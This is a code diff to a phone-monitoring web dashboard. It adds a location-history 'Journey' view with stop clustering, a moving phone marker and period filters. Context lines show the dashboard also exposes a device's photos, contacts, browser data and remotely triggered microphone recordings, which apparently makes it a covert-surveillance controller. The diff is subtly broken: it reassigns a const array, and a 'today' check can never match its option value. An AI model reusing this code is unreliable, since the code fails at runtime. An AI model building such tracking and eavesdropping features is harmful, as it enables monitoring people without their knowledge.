@@ -170,6 +170,22 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 .pb-point-row .ppt-addr.loading{opacity:0.3;font-style:italic}
 .pb-point-row .ppt-addr.done{opacity:0.7}
 .map-hide{display:none!important}
+.phone-marker{width:34px;height:34px;background:var(--success);border:2px solid #fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:17px;box-shadow:0 0 10px rgba(63,185,80,.7),0 2px 6px rgba(0,0,0,.5);transform-origin:center;z-index:1001}
+.phone-marker .phone-emoji{display:block;transform-origin:center;transition:transform .25s ease;line-height:1}
+.phone-ring{position:absolute;left:50%;top:50%;width:60px;height:60px;margin:-30px 0 0 -30px;border:2px solid var(--success);border-radius:50%;opacity:.5;pointer-events:none;animation:phonePulse 2s ease-out infinite}
+@keyframes phonePulse{0%{transform:scale(.6);opacity:.6}100%{transform:scale(1.4);opacity:0}}
+.stop-dot-wrap{display:flex;align-items:center;justify-content:center;width:100%;height:100%}
+.stop-dot{width:11px;height:11px;background:var(--accent);border:2px solid #fff;border-radius:50%;box-shadow:0 1px 4px rgba(0,0,0,.6)}
+.journey-stop-row{display:flex;align-items:flex-start;gap:8px;padding:6px 8px;border-radius:6px;cursor:pointer;font-size:12px;border-left:2px solid var(--border);transition:.07s;background:transparent}
+.journey-stop-row:hover{background:var(--card);border-left-color:var(--accent)}
+.journey-stop-row.pb-point-active{background:var(--card);border-left-color:var(--accent)}
+.journey-stop-row .js-icon{font-size:15px;flex-shrink:0;margin-top:1px}
+.journey-stop-row .js-main{flex:1;min-width:0}
+.journey-stop-row .js-place{font-weight:500;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.journey-stop-row .js-place.loading{color:var(--muted);font-style:italic}
+.journey-stop-row .js-time{color:var(--muted);font-size:10px;margin-top:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.journey-stop-row .js-dur{color:var(--accent);font-size:10px;flex-shrink:0;margin-top:1px}
+.journey-stops-list{display:flex;flex-direction:column;gap:2px;max-height:30vh;overflow-y:auto}
 @media(max-width:480px){
 .pb-point-row{padding:3px 6px;font-size:11px}
 .pb-point-row .ppt-ts{min-width:55px;font-size:10px}
@@ -228,6 +244,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div class="sidebar">
 <div class="tabs" id="tabBar">
 <button class="tab-btn active" data-tab="live">&#x1F4CD; Live</button>
+<button class="tab-btn" data-tab="playback">&#x1F4F1; Journey</button>
 <button class="tab-btn" data-tab="recents">&#x23F1; Recents</button>
 <button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
 <button class="tab-btn" data-tab="videos">&#x1F3AC; Videos</button>
@@ -239,7 +256,6 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <button class="tab-btn" data-tab="contacts">&#x1F4CD; Contacts</button>
 <button class="tab-btn" data-tab="voice">&#x1F3A4; Voice</button>
 <button class="tab-btn" data-tab="remote">&#x1F3A4; Remote</button>
-<button class="tab-btn" data-tab="playback">&#x25B6; Playback</button>
 <button class="tab-btn" data-tab="insights">&#x1F4CA; Insights</button>
 <button class="tab-btn" data-tab="storage">&#x1F4E6; Storage</button>
 <button class="tab-btn" data-tab="browser">&#x1F310; Browser</button>
@@ -262,6 +278,9 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div><div class="label">Updated</div><div class="value" id="updatedVal" style="font-size:13px">--</div></div>
 </div>
 <div class="coord-box" id="coordBox" style="cursor:pointer" title="Click to copy">--</div>
+<div style="display:flex;gap:6px;flex-wrap:wrap;margin:6px 0">
+<button class="chip" id="viewHistoryBtn" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:13px;padding:7px 14px">&#x1F4F1; View Location History</button>
+</div>
 <div class="label">Address</div>
 <div class="value" id="addrVal" style="font-size:15px;color:var(--muted)">--</div>
 <div class="card" style="border-left-color:var(--success);margin-top:8px;padding:8px 12px">
@@ -681,8 +700,6 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <span><span style="color:var(--muted)">&#x1F4CC;</span> <strong id="stPoints">--</strong></span>
 <span><span style="color:var(--muted)">&#x23F1;</span> <strong id="stDuration">--</strong></span>
 <span><span style="color:var(--muted)">&#x1F4D0;</span> <strong id="stDistance">--</strong></span>
-<span><span style="color:var(--muted)">&#x1F3D3;</span> <strong id="stRoadDist">--</strong></span>
-<span style="color:var(--success)">&#x2B50; <strong id="stHighAcc">0</strong></span>
 </div>
 <div style="font-size:12px;color:var(--muted);margin-top:4px">
 <span id="stRange">--</span>
@@ -691,6 +708,30 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 </div>
 <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin:10px 0 8px">
 <div class="pg" style="gap:4px">
+<select id="periodUnit" style="font-size:12px;padding:4px 20px 4px 6px;min-height:28px">
+<option value="3600">Today</option>
+<option value="86400" selected>Last 24 hrs</option>
+<option value="604800">Last 7 days</option>
+<option value="2592000">Last 30 days</option>
+<option value="0">All time</option>
+</select>
+<button class="chip" id="loadHistoryBtn" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:12px">&#x1F5FA;&#xFE0F; Load</button>
+</div>
+</div>
+<div style="display:flex;gap:6px;align-items:center;margin:6px 0">
+<button class="chip" id="journeyOptionsBtn" style="background:var(--card);color:var(--muted);border-color:var(--border);font-size:11px">&#x2699;&#xFE0F; Options</button>
+</div>
+<div id="journeyOptions" style="display:none;margin:6px 0 8px;padding:8px 10px;background:var(--card);border:1px solid var(--border);border-radius:var(--radius)">
+<div style="display:flex;gap:14px;align-items:center;flex-wrap:wrap;margin-bottom:6px">
+<label style="display:flex;align-items:center;gap:4px;font-size:12px;color:var(--muted);cursor:pointer">
+<input type="checkbox" id="showStopsOpt" checked> Show stops
+</label>
+<label style="display:flex;align-items:center;gap:4px;font-size:12px;color:var(--muted);cursor:pointer">
+<input type="checkbox" id="showTrailOpt" checked> Show path
+</label>
+</div>
+<div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap">
+<div class="pg" style="gap:4px">
 <select id="accuracyFilter" style="font-size:12px;padding:4px 16px 4px 6px;min-height:28px">
 <option value="gps">&#x1F4E1; GPS only</option>
 <option value="0">Accuracy: All</option>
@@ -698,63 +739,47 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <option value="50">≤ 50 m</option>
 <option value="100">≤ 100 m</option>
 <option value="200">≤ 200 m</option>
-<option value="500">≤ 500 m</option>
 </select>
 </div>
-</div>
-<div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;margin:10px 0 8px">
 <div class="pg" style="gap:4px">
-<select id="periodUnit" style="font-size:12px;padding:4px 20px 4px 6px;min-height:28px">
-<option value="3600">Last hour</option>
-<option value="21600">Last 6 hrs</option>
-<option value="43200">Last 12 hrs</option>
-<option value="86400" selected>Last 24 hrs</option>
-<option value="259200">Last 3 days</option>
-<option value="604800">Last 7 days</option>
-<option value="2592000">Last 30 days</option>
-<option value="0">All time</option>
+<select id="speedSelect" style="font-size:12px;padding:4px 16px 4px 6px;min-height:28px">
+<option value="5">5x</option>
+<option value="10">10x</option>
+<option value="60" selected>60x</option>
+<option value="300">300x</option>
+<option value="1200">1200x</option>
 </select>
-<button class="chip" id="loadHistoryBtn" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:12px">&#x1F4C5; Load</button>
 </div>
 </div>
-<div style="display:flex;gap:6px;align-items:center;margin:6px 0">
-<button class="chip" id="routeToggleBtn" style="background:var(--success);color:#000;border-color:var(--success);font-size:11px">&#x1F3D3; Road View</button>
-<span id="routeStatus" style="font-size:11px;color:var(--muted)"></span>
 </div>
-<div id="pbPointList" style="margin-top:6px"><div class="label">Load history to see points</div></div>
+<div style="display:flex;justify-content:space-between;align-items:center;margin:4px 0 6px">
+<span style="font-size:13px;font-weight:500">&#x1F4CD; Stops</span>
+<span id="stopsCount" style="font-size:12px;color:var(--muted)"></span>
+</div>
+<div id="pbPointList"><div class="label">Load history to see stops</div></div>
 </div>
 </div>
 </div>
 <div class="map-wrap" id="mapWrap">
 <div id="map"></div>
-    <div class="pb-bar" id="playbackBar" style="display:none">
-  <div class="pb-grp">
-    <button class="pb-btn" id="playBtn" title="Play/Pause">&#x25B6;</button>
-    <button class="pb-btn" id="rewindBtn" title="Reset">&#x23EE;</button>
-    <button class="pb-btn" id="dirBtn" title="Direction: Forward">&#x2192;</button>
-    <button class="pb-btn" id="loopBtn" title="Loop: Off">&#x21BA;</button>
-  </div>
-  <div class="pb-div"></div>
-  <div class="pb-grp">
-    <select id="speedSelect">
-      <option value="1">1x</option><option value="5">5x</option>
-      <option value="10" selected>10x</option><option value="50">50x</option>
-      <option value="120">120x</option><option value="600">600x</option>
-    </select>
-  </div>
-  <div class="pb-div"></div>
-  <div class="pb-grp pb-scrub">
-    <input type="range" id="playScrubber" min="0" max="100" value="0">
-    <div class="pb-slab">
-      <span id="playTsStart">--</span>
-      <span id="playTsEnd">--</span>
-    </div>
-  </div>
-  <div class="pb-div"></div>
-  <div class="pb-grp pb-info">
-    <span class="pb-cnt" id="playCount">0/0</span>
-    <span class="pb-meta" id="playMeta">--</span>
-  </div>
+<div class="pb-bar" id="playbackBar" style="display:none">
+<div class="pb-grp">
+<button class="pb-btn" id="playBtn" title="Play/Pause">&#x25B6;</button>
+<button class="pb-btn" id="rewindBtn" title="Reset">&#x23EE;</button>
+</div>
+<div class="pb-div"></div>
+<div class="pb-grp pb-scrub">
+<input type="range" id="playScrubber" min="0" max="100" value="0">
+<div class="pb-slab">
+<span id="playTsStart">--</span>
+<span id="playTsEnd">--</span>
+</div>
+</div>
+<div class="pb-div"></div>
+<div class="pb-grp pb-info">
+<span class="pb-cnt" id="playCount">0/0</span>
+<span class="pb-meta" id="playMeta">--</span>
+</div>
 </div>
 </div>
 </div>
@@ -779,7 +804,9 @@ let recordingDevice = null;
 let _remoteRecordingActive = false;
 let locationHistory = [];
 let historyAutoLoaded = false;
+let historyLoaded = false;
 let marker, accuracyCircle, trail;
+let phoneMarker = null, phoneRing = null;
 let geofences = [];
 let geofenceAlertLog = JSON.parse(localStorage.getItem('geofenceAlertLog') || '[]');
 let routeCache = {};
@@ -1390,6 +1417,14 @@ function pktShort(ts) {
   const d = new Date(ts);
   return d.toLocaleString('en-PK', { timeZone: PKT, hour12: true, hour: 'numeric', minute: '2-digit', second: '2-digit' });
 }
+function startOfTodayPKT() {
+  try {
+    const parts = new Intl.DateTimeFormat('en-CA', { timeZone: PKT, year: 'numeric', month: '2-digit', day: '2-digit' }).formatToParts(new Date());
+    const get = (t) => (parts.find(p => p.type === t) || {}).value || '';
+    const s = `${get('year')}-${get('month')}-${get('day')}T00:00:00Z`;
+    return Date.parse(s) - 5 * 3600000;
+  } catch { return Date.now() - 3600000; }
+}
 function pktTime(ts) {
   const d = new Date(ts);
   return d.toLocaleString('en-PK', { timeZone: PKT, hour12: true, month: 'short', day: '2-digit', hour: 'numeric', minute: '2-digit' });
@@ -1747,6 +1782,8 @@ function switchTab(name) {
   const btn = document.querySelector('.tab-btn[data-tab="' + name + '"]');
   if (btn) btn.click();
 }
+
+document.getElementById('viewHistoryBtn').addEventListener('click', () => switchTab('playback'));
 
 function deviceLabelFor(id) {
   const d = devices[id];
@@ -2406,6 +2443,7 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   localStorage.setItem('selectedDevice', selectedDevice);
   locationHistory = [];
   historyAutoLoaded = false;
+  historyLoaded = false;
   clearPhotoCache();
   clearVideoCache();
   playbackPoints = [];
@@ -2425,6 +2463,9 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   window.permCache = null;
   window.permLastSync = 0;
   if (trail) { map.removeLayer(trail); trail = null; }
+  if (phoneMarker) { map.removeLayer(phoneMarker); phoneMarker = null; }
+  if (phoneRing) { map.removeLayer(phoneRing); phoneRing = null; }
+  journeyStops = [];
   loadGeofences(selectedDevice);
   resetHomeState();
   pollHomeConfig();
@@ -4609,108 +4650,65 @@ function updateMap(loc) {
   if (loc.isHighAccuracy && loc.satellites) {
     marker.setTooltipContent('\uD83D\uDDF2 ' + loc.satellites + ' satellites');
   }
+  if (historyLoaded) return;
   locationHistory.push({ lat: loc.lat, lng: loc.lng, ts: loc.ts_ms || Date.now(), speed: loc.speed, accuracy: loc.accuracy, isHighAccuracy: loc.isHighAccuracy === true, satellites: loc.satellites || 0 });
   if (locationHistory.length > 500) locationHistory.shift();
-  updateTrail(true);
+  updateTrail();
   if (locationHistory.length === 1) map.setView(latlng, 15);
 }
 
-// --- Gradient Trail ---
-const TRAIL_COLORS = ['#1a3a5c', '#2a5a7c', '#3a7a9c', '#4a9abc', '#5ababc', '#7acc7a', '#aadd55', '#ddee44', '#ffca28', '#ff8c00'];
+// --- Journey Layers (single thin path + dwell stop dots) ---
+const STOP_RADIUS_M = 25;
+let journeyStops = [];
 
-function buildGradientTrail(pts, routedGeometry) {
-  if (pts.length < 2) return null;
-  const group = L.layerGroup();
-  if (routedGeometry && routedGeometry.length > 1) {
-    const indices = routePointIndices;
-    if (indices.length === pts.length) {
-      for (let i = 0; i < pts.length - 1; i++) {
-        const fi = indices[i] !== undefined ? indices[i] : 0;
-        const ti = indices[i + 1] !== undefined ? indices[i + 1] : routedGeometry.length - 1;
-        const si = Math.min(fi, ti);
-        const ei = Math.max(fi, ti) + 1;
-        const chunk = routedGeometry.slice(si, ei).map(p => [p[1], p[0]]);
-        if (chunk.length < 2) continue;
-        const ci = Math.min(Math.floor(i / Math.max(1, Math.floor(pts.length / TRAIL_COLORS.length))), TRAIL_COLORS.length - 1);
-        const opacity = 0.3 + 0.6 * (i / pts.length);
-        const segPts = pts.slice(i, Math.min(i + Math.ceil(pts.length / TRAIL_COLORS.length) + 1, pts.length));
-        const hasHighAccuracy = segPts.some(p => p.isHighAccuracy);
-        const weight = hasHighAccuracy ? 4.5 : 2.5;
-        const color = hasHighAccuracy ? '#3fb950' : TRAIL_COLORS[ci];
-        L.polyline(chunk, { color, weight, opacity }).addTo(group);
-        if (hasHighAccuracy) {
-          L.polyline(chunk, { color: '#3fb950', weight: 8, opacity: 0.15 }).addTo(group);
-        }
-      }
+function clusterStops(pts) {
+  const stops = [];
+  let cur = null;
+  for (const p of pts) {
+    if (!cur || haversine(cur.lat, cur.lng, p.lat, p.lng) > STOP_RADIUS_M) {
+      cur = { lat: p.lat, lng: p.lng, startTs: p.ts, endTs: p.ts, count: 1 };
+      stops.push(cur);
     } else {
-      const chunk = routedGeometry.map(p => [p[1], p[0]]);
-      L.polyline(chunk, { color: '#5ababc', weight: 3, opacity: 0.7 }).addTo(group);
+      cur.lat = (cur.lat * cur.count + p.lat) / (cur.count + 1);
+      cur.lng = (cur.lng * cur.count + p.lng) / (cur.count + 1);
+      cur.count += 1;
+      cur.endTs = p.ts;
     }
-    return group;
   }
-  const segs = Math.min(TRAIL_COLORS.length, pts.length);
-  const chunkSize = Math.max(1, Math.floor(pts.length / segs));
-  for (let i = 0; i < pts.length - 1; i += chunkSize) {
-    const end = Math.min(i + chunkSize + 1, pts.length);
-    const chunk = pts.slice(i, end).map(p => [p.lat, p.lng]);
-    if (chunk.length < 2) continue;
-    const ci = Math.min(Math.floor(i / chunkSize), TRAIL_COLORS.length - 1);
-    const opacity = 0.3 + 0.6 * (i / pts.length);
-    const segPts = pts.slice(i, end);
-    const hasHighAccuracy = segPts.some(p => p.isHighAccuracy);
-    const weight = hasHighAccuracy ? 4.5 : 2.5;
-    const color = hasHighAccuracy ? '#3fb950' : TRAIL_COLORS[ci];
-    L.polyline(chunk, { color, weight, opacity }).addTo(group);
-    if (hasHighAccuracy) {
-      L.polyline(chunk, { color: '#3fb950', weight: 8, opacity: 0.15 }).addTo(group);
+  return stops;
+}
+
+function buildJourneyLayers(pts) {
+  if (!pts.length) return null;
+  const group = L.layerGroup();
+  journeyStops = clusterStops(pts);
+  if (document.getElementById('showTrailOpt').checked && pts.length > 1) {
+    L.polyline(pts.map(p => [p.lat, p.lng]), {
+      color: '#3fb950', weight: 3, opacity: 0.55, interactive: false
+    }).addTo(group);
+  }
+  if (document.getElementById('showStopsOpt').checked) {
+    for (const s of journeyStops) {
+      L.circleMarker([s.lat, s.lng], {
+        radius: 7, color: '#ffca28', weight: 2,
+        fillColor: 'rgba(255,202,40,.35)', fillOpacity: 1, interactive: false
+      }).addTo(group);
     }
   }
   return group;
 }
 
-async function updateTrail(skipRouting) {
+function updateTrail() {
   if (trail) { map.removeLayer(trail); trail = null; }
-  if (locationHistory.length < 2) {
+  if (locationHistory.length < 1) {
     document.getElementById('playbackBar').style.display = 'none';
-    playbackRoute = null;
-    routePointIndices = [];
-    routeDistances = [];
-    routeTotalDistance = 0;
+    journeyStops = [];
     return;
   }
-  let pts = locationHistory;
-  playbackRoute = null;
-  routePointIndices = [];
-  routeDistances = [];
-  routeTotalDistance = 0;
-  if (routeUseRoad && !skipRouting) {
-    document.getElementById('routeStatus').textContent = 'Routing...';
-    routingInProgress = true;
-    const cacheKey = getRouteCacheKey(selectedDevice || 'unknown', pts.length, pts[0]?.ts || 0, pts[pts.length-1]?.ts || 0);
-    const cached = getCachedRoute(cacheKey);
-    let routed = null;
-    if (cached) {
-      routed = cached;
-    } else {
-      routed = await fetchOSRMRouteBatched(pts);
-      if (routed) setCachedRoute(cacheKey, routed);
-    }
-    routingInProgress = false;
-    if (routed && routed.geometry && routed.geometry.length > 1) {
-      playbackRoute = routed.geometry;
-      routeDistances = computeRouteDistances(routed.geometry);
-      routeTotalDistance = routeDistances[routeDistances.length - 1] || 0;
-      routePointIndices = buildRoutePointIndices(pts, routed.geometry);
-      document.getElementById('routeStatus').textContent = 'Road route loaded';
-    } else {
-      document.getElementById('routeStatus').textContent = 'Using straight lines (routing unavailable)';
-      showAlert('Road routing unavailable \u2014 showing straight lines', 'warn');
-    }
-  } else if (skipRouting) {
-    document.getElementById('routeStatus').textContent = '';
-  }
-  trail = buildGradientTrail(pts, playbackRoute);
+  const pts = locationHistory;
+  trail = buildJourneyLayers(pts);
   if (trail) trail.addTo(map);
+  if (historyLoaded && pts.length) ensurePhoneMarker(pts[0].lat, pts[0].lng, pts[0].bearing);
   document.getElementById('playbackBar').style.display = 'flex';
   document.getElementById('playCount').textContent = `0/${pts.length}`;
   setupPlayback(pts);
@@ -4746,8 +4744,40 @@ function stopPlayback() {
 
 function lerp(a, b, t) { return a + (b - a) * t; }
 
+function ensurePhoneMarker(lat, lng, bearing) {
+  if (!phoneMarker) {
+    phoneMarker = L.marker([lat, lng], {
+      icon: L.divIcon({
+        className: '',
+        html: '<div class="phone-marker"><span class="phone-emoji">\u{1F4F1}</span></div>',
+        iconSize: [34, 34],
+        iconAnchor: [17, 17]
+      }),
+      zIndexOffset: 1000,
+      interactive: false
+    }).addTo(map);
+    phoneRing = L.circleMarker([lat, lng], {
+      radius: 10,
+      color: '#3fb950',
+      weight: 2,
+      fillColor: 'rgba(63,185,80,.25)',
+      fillOpacity: 1,
+      interactive: false
+    }).addTo(map);
+  }
+  phoneMarker.setLatLng([lat, lng]);
+  if (phoneRing) phoneRing.setLatLng([lat, lng]);
+  if (bearing != null && !isNaN(bearing)) {
+    const el = phoneMarker.getElement();
+    if (el) {
+      const em = el.querySelector('.phone-emoji');
+      if (em) em.style.transform = 'rotate(' + bearing + 'deg)';
+    }
+  }
+}
+
 function setMarkerPos(lat, lng, ts) {
-  if (marker) marker.setLatLng([lat, lng]);
+  ensurePhoneMarker(lat, lng);
 }
 
 function panIfNeeded(lat, lng) {
@@ -4762,20 +4792,6 @@ function panIfNeeded(lat, lng) {
   }
 }
 
-function getRoutedPosition(segFrom, segTo, frac) {
-  if (!playbackRoute || playbackRoute.length < 2 || routePointIndices.length === 0) return null;
-  const fi = routePointIndices[segFrom];
-  const ti = routePointIndices[segTo];
-  if (fi === undefined || ti === undefined) return null;
-  const si = Math.min(fi, ti);
-  const ei = Math.max(fi, ti);
-  if (si === ei) return { lat: playbackRoute[si][1], lng: playbackRoute[si][0] };
-  const segDist = routeDistances[ei] - routeDistances[si];
-  if (segDist <= 0) return { lat: playbackRoute[si][1], lng: playbackRoute[si][0] };
-  const targetDist = routeDistances[si] + segDist * frac;
-  return positionOnRoute(playbackRoute, routeDistances, targetDist);
-}
-
 function updatePlaybackDisplay(lat, lng, ts, fromIdx, toIdx, frac) {
   const pts = playbackPoints;
   const totalSegs = Math.max(1, pts.length - 1);
@@ -4783,8 +4799,8 @@ function updatePlaybackDisplay(lat, lng, ts, fromIdx, toIdx, frac) {
   document.getElementById('playScrubber').value = scrubVal;
   document.getElementById('playCount').textContent = `${fromIdx + 1}/${pts.length}`;
   const displayTs = Math.round(ts);
-  setMarkerPos(lat, lng, displayTs);
-  if (marker) marker.setPopupContent(pkt(displayTs));
+  const bearing = pts[toIdx] && pts[toIdx].bearing != null ? pts[toIdx].bearing : null;
+  ensurePhoneMarker(lat, lng, bearing);
   panIfNeeded(lat, lng);
   const cur = { lat, lng, ts: displayTs, accuracy: pts[fromIdx] ? pts[fromIdx].accuracy : 0 };
   updatePlaybackUI(cur);
@@ -4827,21 +4843,15 @@ function animatePlayback() {
   const elapsed = (performance.now() - segStartTime) * speed;
   let t = elapsed / segRealGap;
   if (t >= 1) {
-    const fromP = pts[segFrom], toP = pts[segTo];
-    let lat, lng;
-    const routed = getRoutedPosition(segFrom, segTo, 1);
-    if (routed) { lat = routed.lat; lng = routed.lng; }
-    else { lat = toP.lat; lng = toP.lng; }
-    updatePlaybackDisplay(lat, lng, toP.ts, segFrom, segTo, 1);
+    const toP = pts[segTo];
+    updatePlaybackDisplay(toP.lat, toP.lng, toP.ts, segFrom, segTo, 1);
     if (!advanceSegment()) return;
     t = 0;
     segStartTime = performance.now();
   }
   const fromP = pts[segFrom], toP = pts[segTo];
-  let lat, lng;
-  const routed = getRoutedPosition(segFrom, segTo, t);
-  if (routed) { lat = routed.lat; lng = routed.lng; }
-  else { lat = lerp(fromP.lat, toP.lat, t); lng = lerp(fromP.lng, toP.lng, t); }
+  const lat = lerp(fromP.lat, toP.lat, t);
+  const lng = lerp(fromP.lng, toP.lng, t);
   const ts = lerp(fromP.ts, toP.ts, t);
   updatePlaybackDisplay(lat, lng, ts, segFrom, segTo, t);
   animFrameId = requestAnimationFrame(animatePlayback);
@@ -4876,46 +4886,9 @@ document.getElementById('rewindBtn').addEventListener('click', () => {
   document.getElementById('playCount').textContent = playbackPoints.length ? '1/' + playbackPoints.length : '0/0';
   if (playbackPoints.length && playbackPoints[playbackIdx]) {
     const p = playbackPoints[playbackIdx];
-    setMarkerPos(p.lat, p.lng, p.ts);
-    if (marker) marker.setPopupContent(pkt(p.ts)).openPopup();
+    ensurePhoneMarker(p.lat, p.lng, p.bearing);
     map.panTo([p.lat, p.lng], { animate: true, duration: 0.3 });
     updatePlaybackUI(p);
-  }
-});
-
-// --- Direction Toggle ---
-document.getElementById('dirBtn').addEventListener('click', function() {
-  playbackDirection = playbackDirection === 1 ? -1 : 1;
-  this.textContent = playbackDirection === 1 ? '\u2192' : '\u2190';
-  this.title = 'Direction: ' + (playbackDirection === 1 ? 'Forward' : 'Reverse');
-  this.classList.toggle('pb-on', playbackDirection === -1);
-  stopPlayback();
-  document.getElementById('playBtn').textContent = '\u25B6';
-});
-
-// --- Loop Toggle ---
-document.getElementById('loopBtn').addEventListener('click', function() {
-  playbackLoop = !playbackLoop;
-  this.classList.toggle('pb-on', playbackLoop);
-  this.title = 'Loop: ' + (playbackLoop ? 'On' : 'Off');
-});
-
-document.getElementById('routeToggleBtn').addEventListener('click', async function() {
-  routeUseRoad = !routeUseRoad;
-  this.textContent = routeUseRoad ? '\uD83C\uDFD3 Road View' : '\u27F6 Direct View';
-  this.style.background = routeUseRoad ? 'var(--success)' : 'var(--accent)';
-  this.style.borderColor = routeUseRoad ? 'var(--success)' : 'var(--accent)';
-  if (locationHistory.length >= 2) {
-    if (routeUseRoad) {
-      document.getElementById('routeStatus').textContent = 'Routing...';
-    } else {
-      document.getElementById('routeStatus').textContent = 'Straight lines';
-      playbackRoute = null;
-      routePointIndices = [];
-      routeDistances = [];
-      routeTotalDistance = 0;
-    }
-    await updateTrail();
   }
 });
 
@@ -4929,8 +4902,7 @@ document.getElementById('playScrubber').addEventListener('input', function() {
   playbackIdx = segIdx;
   const p = pts[segIdx];
   if (p) {
-    setMarkerPos(p.lat, p.lng, p.ts);
-    if (marker) marker.setPopupContent(pkt(p.ts)).openPopup();
+    ensurePhoneMarker(p.lat, p.lng, p.bearing);
     document.getElementById('playCount').textContent = `${segIdx + 1}/${pts.length}`;
     updatePlaybackUI(p);
     highlightPointInList(segIdx);
@@ -4944,7 +4916,7 @@ function isGpsPoint(v) {
   const src = String(v.source || '');
   return GPS_SOURCES.includes(src);
 }
-async function loadDeviceHistory(deviceId, periodSeconds, maxAccuracy, gpsOnly) {
+async function loadDeviceHistory(deviceId, periodSeconds, maxAccuracy, gpsOnly, cutoffTs) {
   const pts = [];
   // Single fetch — walk the entire tree in-memory (no recursive HTTP calls)
   const data = await fetchRTDB(`devices/${deviceId}/location/history`);
@@ -4965,6 +4937,7 @@ async function loadDeviceHistory(deviceId, periodSeconds, maxAccuracy, gpsOnly) 
               lng: parseFloat(v.lng),
               accuracy: acc,
               speed: v.speed != null ? parseFloat(v.speed) : 0,
+              bearing: v.bearing != null ? parseFloat(v.bearing) : null,
               isHighAccuracy: v.isHighAccuracy === true,
               satellites: v.satellites != null ? parseInt(v.satellites) : 0,
               source: v.source != null ? String(v.source) : ''
@@ -4977,19 +4950,32 @@ async function loadDeviceHistory(deviceId, periodSeconds, maxAccuracy, gpsOnly) 
     }
   }
   walk(data);
-  // Deduplicate by lat|lng|rounded_second (keep first occurrence)
-  const seen = new Set();
-  const deduped = [];
+  // Deduplicate by lat|lng|rounded_second (keep the most accurate duplicate)
+  const seen = new Map();
   for (const p of pts) {
     const sec = Math.floor(p.ts / 1000);
     const k = `${p.lat.toFixed(4)}|${p.lng.toFixed(4)}|${sec}`;
-    if (!seen.has(k)) { seen.add(k); deduped.push(p); }
+    const existing = seen.get(k);
+    if (!existing) { seen.set(k, p); }
+    else if (p.accuracy < existing.accuracy) { seen.set(k, p); }
   }
+  const deduped = [...seen.values()];
   pts.length = 0; pts.push(...deduped);
   pts.sort((a, b) => a.ts - b.ts);
-  if (periodSeconds > 0 && pts.length) {
+  if (cutoffTs) {
+    pts = pts.filter(p => p.ts >= cutoffTs);
+  } else if (periodSeconds > 0 && pts.length) {
     const cutoff = pts[pts.length - 1].ts - periodSeconds * 1000;
-    return pts.filter(p => p.ts >= cutoff);
+    pts = pts.filter(p => p.ts >= cutoff);
+  }
+  // Cap at 3000 fixes — even sample across the whole range to preserve coverage
+  const MAX_FIXES = 3000;
+  if (pts.length > MAX_FIXES) {
+    const step = pts.length / MAX_FIXES;
+    const sampled = [];
+    for (let i = 0; i < MAX_FIXES; i++) sampled.push(pts[Math.floor(i * step)]);
+    sampled.push(pts[pts.length - 1]);
+    pts = sampled;
   }
   return pts;
 }
@@ -4997,23 +4983,35 @@ async function loadDeviceHistory(deviceId, periodSeconds, maxAccuracy, gpsOnly) 
 async function reloadHistory(showAlertMsg) {
   if (!selectedDevice) return;
   if (playbackRunning) stopPlayback();
-  const periodSeconds = parseInt(document.getElementById('periodUnit').value);
+  const periodVal = document.getElementById('periodUnit').value;
+  const periodSeconds = parseInt(periodVal);
+  const cutoffTs = periodVal === 'today' ? startOfTodayPKT() : null;
   const accRaw = document.getElementById('accuracyFilter').value;
   const gpsOnly = accRaw === 'gps';
   const accVal = gpsOnly ? 0 : parseInt(accRaw);
   const maxAcc = accVal > 0 ? accVal : 0;
-  const pts = await loadDeviceHistory(selectedDevice, periodSeconds, maxAcc, gpsOnly);
+  const pts = await loadDeviceHistory(selectedDevice, periodSeconds, maxAcc, gpsOnly, cutoffTs);
   if (!pts.length) {
+    historyLoaded = false;
+    locationHistory = [];
+    playbackPoints = [];
+    if (trail) { map.removeLayer(trail); trail = null; }
+    journeyStops = [];
+    document.getElementById('playbackBar').style.display = 'none';
+    document.getElementById('pbStats').style.display = 'none';
+    document.getElementById('pbPointList').innerHTML = '<div class="label">No history points in this range</div>';
+    const stopsEl = document.getElementById('stopsCount');
+    if (stopsEl) stopsEl.textContent = '';
     if (showAlertMsg) showAlert('No history points in range', 'warn');
     return;
   }
+  historyLoaded = true;
   locationHistory = pts;
-  await updateTrail();
-  renderPlaybackTab();
-  if (pts.length) map.fitBounds(pts.map(p => [p.lat, p.lng]));
+  updateTrail();
+  if (pts.length) map.fitBounds(pts.map(p => [p.lat, p.lng]), { padding: [24, 24] });
   if (showAlertMsg) {
     const label = document.getElementById('periodUnit').options[document.getElementById('periodUnit').selectedIndex].text;
-    showAlert(`Loaded ${pts.length} points (${label})`, 'warn');
+    showAlert(`Loaded ${pts.length} fixes (${label})`, 'warn');
   }
 }
 
@@ -5026,6 +5024,22 @@ document.getElementById('accuracyFilter').addEventListener('change', () => {
 });
 document.getElementById('periodUnit').addEventListener('change', () => {
   if (historyAutoLoaded) reloadHistory(true);
+});
+
+document.getElementById('journeyOptionsBtn').addEventListener('click', function() {
+  const panel = document.getElementById('journeyOptions');
+  const open = panel.style.display !== 'none';
+  panel.style.display = open ? 'none' : 'block';
+  this.style.background = open ? 'var(--card)' : 'var(--accent)';
+  this.style.color = open ? 'var(--muted)' : '#000';
+  this.style.borderColor = open ? 'var(--border)' : 'var(--accent)';
+});
+
+document.getElementById('showStopsOpt').addEventListener('change', () => {
+  if (locationHistory.length) updateTrail();
+});
+document.getElementById('showTrailOpt').addEventListener('change', () => {
+  if (locationHistory.length) updateTrail();
 });
 
